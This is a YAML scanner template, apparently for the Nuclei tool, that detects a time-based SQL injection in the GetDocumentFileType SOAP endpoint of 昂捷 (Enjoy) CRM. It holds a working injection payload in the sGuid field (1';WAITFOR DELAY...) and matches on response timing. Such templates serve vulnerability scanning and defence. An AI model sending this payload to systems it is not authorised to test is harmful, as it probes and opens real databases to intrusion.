folder-5/poc-yaml-enjoyrmis-getdocumentfiletype-sqli.yaml

id: poc-yaml-enjoyrmis-getdocumentfiletype-sqli

info:
  name: 昂捷CRM GetDocumentFileType SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Detects SQL Injection vulnerability in the GetDocumentFileType operation of 昂捷CRM. The vulnerability allows time-based SQL injection via the sGuid parameter.

variables:
  t1: "{{rand_int(3,8)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        POST /enjoyRMIS_WS/WS/OA/CWSOffice.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetDocumentFileType"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetDocumentFileType xmlns="http://tempuri.org/">
              <sGuid>1';WAITFOR DELAY '0:0:{{t1}}'--</sGuid>
            </GetDocumentFileType>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "GetDocumentFileTypeResponse"
          - "GetDocumentFileTypeResult"
      - type: word
        part: header
        words:
          - "text/xml"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
